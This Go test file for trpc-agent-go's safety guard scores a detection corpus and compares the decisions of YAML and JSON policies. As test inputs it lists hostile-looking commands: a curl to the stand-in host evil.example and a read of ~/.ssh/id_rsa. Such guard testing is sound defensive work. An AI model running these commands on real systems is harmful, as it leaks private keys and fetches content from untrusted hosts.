//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"encoding/json"
	"os"
	"testing"

	"github.com/stretchr/testify/require"
)

type corpusCase struct {
	Name              string   `json:"name"`
	Label             string   `json:"label"`
	Command           string   `json:"command"`
	ExpectedDecision  Decision `json:"expected_decision"`
	RequiredRuleIDs   []string `json:"required_rule_ids"`
	MandatoryCategory string   `json:"mandatory_category"`
}

type categoryStats struct {
	total int
	hits  int
}

type corpusStats struct {
	hazardTotal int
	hazardHits  int
	safeTotal   int
	falseHits   int
	categories  map[string]categoryStats
}

func TestDetectionCorpusAcceptance(t *testing.T) {
	cases := loadCorpus(t)
	policy, err := LoadPolicy("testdata/policy_full.yaml")
	require.NoError(t, err)
	guard, err := NewGuard(policy)
	require.NoError(t, err)
	stats := corpusStats{categories: make(map[string]categoryStats)}
	for _, current := range cases {
		report, scanErr := guard.Scan(
			context.Background(),
			scanCommand(current.Command),
		)
		require.NoError(t, scanErr, current.Name)
		require.Equal(t, current.ExpectedDecision, report.Decision, current.Name)
		stats.record(t, current, report)
	}
	stats.requireAcceptance(t)
}

func loadCorpus(t *testing.T) []corpusCase {
	t.Helper()
	data, err := os.ReadFile("testdata/detection_corpus.json")
	require.NoError(t, err)
	var cases []corpusCase
	require.NoError(t, json.Unmarshal(data, &cases))
	require.GreaterOrEqual(t, len(cases), 20)
	return cases
}

func (stats *corpusStats) record(
	t *testing.T,
	current corpusCase,
	report Report,
) {
	t.Helper()
	if current.Label == "safe" {
		stats.safeTotal++
		if report.Decision != DecisionAllow {
			stats.falseHits++
		}
		return
	}
	stats.hazardTotal++
	hit := report.Decision != DecisionAllow &&
		reportHasAnyRule(report, current.RequiredRuleIDs)
	if hit {
		stats.hazardHits++
	}
	require.NotEmpty(t, current.RequiredRuleIDs, current.Name)
	if current.MandatoryCategory != "" {
		category := stats.categories[current.MandatoryCategory]
		category.total++
		if hit {
			category.hits++
		}
		stats.categories[current.MandatoryCategory] = category
	}
}

func (stats corpusStats) requireAcceptance(t *testing.T) {
	t.Helper()
	require.Positive(t, stats.hazardTotal)
	require.Positive(t, stats.safeTotal)
	require.GreaterOrEqual(t, float64(stats.hazardHits)/float64(stats.hazardTotal), 0.9)
	require.LessOrEqual(t, float64(stats.falseHits)/float64(stats.safeTotal), 0.1)
	for _, name := range []string{
		"dangerous_delete",
		"credential_read",
		"non_allowlisted_network",
	} {
		category := stats.categories[name]
		require.GreaterOrEqual(t, category.total, 2, name)
		require.Equal(t, category.total, category.hits, name)
	}
}

func reportHasAnyRule(report Report, required []string) bool {
	for _, ruleID := range required {
		if report.RuleID == ruleID {
			return true
		}
		for _, finding := range report.Findings {
			if finding.RuleID == ruleID {
				return true
			}
		}
	}
	return false
}

func TestFullPolicyYAMLAndJSONDriveEquivalentDecisions(t *testing.T) {
	yamlPolicy, err := LoadPolicy("testdata/policy_full.yaml")
	require.NoError(t, err)
	jsonPolicy, err := LoadPolicy("testdata/policy_full.json")
	require.NoError(t, err)
	yamlGuard, err := NewGuard(yamlPolicy)
	require.NoError(t, err)
	jsonGuard, err := NewGuard(jsonPolicy)
	require.NoError(t, err)

	for _, command := range []string{
		"go test ./...",
		"curl https://api.github.com/repos/x/y",
		"curl https://evil.example/file",
		"cat ~/.ssh/id_rsa",
	} {
		yamlReport, scanErr := yamlGuard.Scan(context.Background(), scanCommand(command))
		require.NoError(t, scanErr)
		jsonReport, scanErr := jsonGuard.Scan(context.Background(), scanCommand(command))
		require.NoError(t, scanErr)
		require.Equal(t, yamlReport.Decision, jsonReport.Decision, command)
		require.Equal(t, yamlReport.RuleID, jsonReport.RuleID, command)
	}
}
